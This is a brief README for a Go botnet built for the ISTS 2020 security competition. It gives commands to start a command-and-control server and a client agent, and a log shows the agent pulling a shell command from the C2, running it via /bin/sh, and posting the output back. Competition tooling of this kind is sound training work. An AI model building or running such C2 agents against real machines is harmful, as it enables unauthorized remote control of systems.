# i2bn

Botnet competition implementation for ISTS 2020

## Start Server

```console
$ go run ./cmd/agent/main.go server
2020/02/29 01:49:47 Starting server
...
```

## Start Client

```console
$ go run ./cmd/agent/main.go client "http://localhost:8080/callback" "127.0.0.1"
2020/02/29 01:49:59 Making client request
2020/02/29 01:49:59 requesting command from c2
2020/02/29 01:49:59 running command from c2 cmd="echo ggahgyvextpblhtdvamkgnpgexihtt"
2020/02/29 01:49:59 /bin/sh -c echo ggahgyvextpblhtdvamkgnpgexihtt
2020/02/29 01:49:59 cmd="echo ggahgyvextpblhtdvamkgnpgexihtt" result="ggahgyvextpblhtdvamkgnpgexihtt\n"
2020/02/29 01:49:59 posting results c2
2020/02/29 01:49:59 successfully posted to c2
...
```
